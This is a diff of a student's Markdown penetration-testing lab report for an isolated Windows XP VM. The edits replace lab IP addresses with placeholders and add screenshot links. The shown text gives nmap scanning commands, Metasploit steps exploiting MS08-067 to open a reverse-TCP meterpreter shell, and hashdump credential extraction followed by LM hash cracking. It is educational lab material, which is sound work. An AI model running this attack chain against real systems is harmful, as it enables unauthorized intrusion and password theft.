@@ -23,9 +23,9 @@ This task involved a full penetration testing cycle against a legacy Windows XP 
 ## **Lab Environment**
 
 *   **Attacker Machine:** Kali Linux 2023.4 (Virtual Machine)
-    *   **IP Address:** `192.168.134.129`
+    *   **IP Address:** `192.168.x.x`
 *   **Target Machine:** Windows XP Professional SP2 (Virtual Machine - **Intentionally vulnerable and isolated**)
-    *   **IP Address:** `192.168.134.133`
+    *   **IP Address:** `192.168.x.x`
     *   **Firewall Status:** Disabled (Required for this lab exercise)
 *   **Network:** Both VMs connected to a virtual "Host-Only" network, ensuring no external connectivity.
 
@@ -48,7 +48,7 @@ The first step was to discover open ports and running services on the target to 
 
 *   **Command Executed:**
     ```bash
-    nmap -sV -p- 192.168.134.133
+    nmap -sV -p- 192.168.x.x
     ```
 *   **Flags Explained:**
     *   `-sV`: Service version detection.
@@ -56,7 +56,7 @@ The first step was to discover open ports and running services on the target to 
 *   **Finding:** The scan revealed open ports, notably port **445/tcp (microsoft-ds)**, indicating the Server Message Block (SMB) service was running. This is a common vector for exploitation on older Windows systems.
 
 **Screenshot 1: Nmap scan results showing open ports on the Windows XP target.**
-*(Insert your screenshot of the Nmap output here)*
+![](https://github.com/malaikatariq/MLSA-UET-Internship/blob/main/Cyber-Security/Week-04/assets/NMAP%20scan.png)
 
 ---
 
@@ -71,7 +71,7 @@ With the SMB service identified, the next step was to find known, public exploit
 *   **Finding:** The `searchsploit` command confirmed the existence of a public exploit for **MS08-067**, a critical remote code execution vulnerability in the Windows Server service.
 
 **Screenshot 2: SearchSploit results showing the MS08-067 exploit module.**
-*(Insert your screenshot of the searchsploit output here)*
+![](https://github.com/malaikatariq/MLSA-UET-Internship/blob/main/Cyber-Security/Week-04/assets/SearchSploit.png)
 
 ---
 
@@ -83,15 +83,16 @@ The Metasploit Framework was used to leverage the discovered vulnerability and g
     ```bash
     msfconsole
     use exploit/windows/smb/ms08_067_netapi
-    set RHOSTS 192.168.134.133
-    set LHOST 192.168.134.129
+    set RHOSTS 192.168.x.x
+    set LHOST 192.168.x.x
     set PAYLOAD windows/meterpreter/reverse_tcp
     exploit
     ```
 *   **Result:** The exploit was successful, and a `meterpreter` session was opened, providing a powerful interactive command shell on the Windows XP system.
 
 **Screenshot 3: Successful Metasploit exploitation resulting in a Meterpreter session.**
-*(Insert your screenshot of the successful `exploit` command and meterpreter prompt here)*
+![](https://github.com/malaikatariq/MLSA-UET-Internship/blob/main/Cyber-Security/Week-04/assets/msfconsole.png)
+![](https://github.com/malaikatariq/MLSA-UET-Internship/blob/main/Cyber-Security/Week-04/assets/Metasploit.png)
 
 ---
 
@@ -106,7 +107,7 @@ With system access established, the next goal was to extract password hashes for
 *   **Result:** The `hashdump` command extracted the LM and NTLM password hashes for all local users from the SAM database. These hashes were saved to a file (`hashes.txt`) on the Kali machine for offline cracking.
 
 **Screenshot 4: Output of the `hashdump` command showing the captured LM and NTLM hashes.**
-*(Insert your screenshot of the hashdump output here)*
+![](https://github.com/malaikatariq/MLSA-UET-Internship/blob/main/Cyber-Security/Week-04/assets/Hashdump.png)
 
 ---
 
@@ -127,7 +128,7 @@ The final step was to crack the extracted hashes to obtain the plaintext passwor
     *   **Result:** **Success!** The LM hash was cracked instantly. This is because the LM hashing algorithm is cryptographically weak and breaks passwords into two 7-character halves, making it highly vulnerable to fast cracking.
 
 **Screenshot 5: John the Ripper successfully cracking the LM hash.**
-*(Insert your screenshot of John showing the cracked password here)*
+![](https://github.com/malaikatariq/MLSA-UET-Internship/blob/main/Cyber-Security/Week-04/assets/LM%20Hash.png)
 
 ---
 
